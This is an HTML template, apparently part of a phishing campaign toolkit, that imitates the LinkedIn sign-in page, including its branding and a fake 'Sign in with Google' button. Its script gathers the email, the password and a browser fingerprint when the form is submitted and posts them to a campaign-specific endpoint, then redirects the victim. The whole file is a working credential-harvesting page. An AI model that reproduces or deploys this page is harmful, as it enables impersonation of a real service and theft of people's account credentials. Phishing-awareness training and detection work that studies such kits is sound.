<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LinkedIn Login, Sign in</title>
  <script src="/fingerprint.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; }
    .card { background:#fff; padding:2rem; width:100%; max-width:400px; text-align:center; }
    .logo { font-size:2.5rem; font-weight:700; color:#0a66c2; margin-bottom:1.5rem; font-family:-apple-system,system-ui,sans-serif; }
    .logo span { background:#0a66c2; color:#fff; padding:0 4px; border-radius:4px; }
    h1 { font-size:1.2rem; font-weight:600; color:#191919; margin-bottom:0.5rem; }
    p { font-size:0.85rem; color:#666; margin-bottom:1.5rem; }
    input { width:100%; padding:0.85rem; border:1px solid #cdcfd2; border-radius:4px; font-size:0.95rem; margin-bottom:0.75rem; }
    input:focus { outline:none; border-color:#0a66c2; box-shadow:0 0 0 1px #0a66c2; }
    button { width:100%; padding:0.8rem; background:#0a66c2; color:#fff; border:none; border-radius:24px; font-size:1rem; font-weight:600; cursor:pointer; margin-top:0.5rem; }
    button:hover { background:#004182; }
    .divider { display:flex; align-items:center; margin:1.2rem 0; color:#666; font-size:0.8rem; }
    .divider::before, .divider::after { content:''; flex:1; border-bottom:1px solid #cdcfd2; }
    .divider::before { margin-right:1rem; } .divider::after { margin-left:1rem; }
    .google-btn { width:100%; padding:0.7rem; background:#fff; border:1px solid #cdcfd2; border-radius:24px; font-size:0.95rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
    .google-btn:hover { background:#f3f2f0; }
    .footer { margin-top:1.5rem; font-size:0.8rem; color:#666; }
    .footer a { color:#0a66c2; text-decoration:none; font-weight:600; }
    .error { color:#d11124; font-size:0.8rem; margin-bottom:0.5rem; display:none; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo"><span>in</span></div>
    <h1>Sign in</h1>
    <p>to continue to your professional network</p>
    <div class="error" id="error">Invalid credentials. Please try again.</div>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or phone" autocomplete="off" required>
      <input type="password" id="password" placeholder="Password" required>
      <a href="#" style="display:block;text-align:left;font-size:0.8rem;color:#0a66c2;text-decoration:none;font-weight:600;">Forgot password?</a>
      <button type="submit">Sign in</button>
    </form>
    <div class="divider">or</div>
    <button class="google-btn" type="button">
      <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
      Sign in with Google
    </button>
    <div class="footer">New to LinkedIn? <a href="#">Join now</a></div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const fp = await getFingerprint();
      try {
        const res = await fetch('/c/<%= campaign.id %>', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password, ...fp, fingerprints: JSON.stringify(fp) })
        });
        const data = await res.json();
        if (data.redirect) window.location.href = data.redirect;
      } catch { window.location.href = '<%= redirect %>'; }
    });
  </script>
</body>
</html>
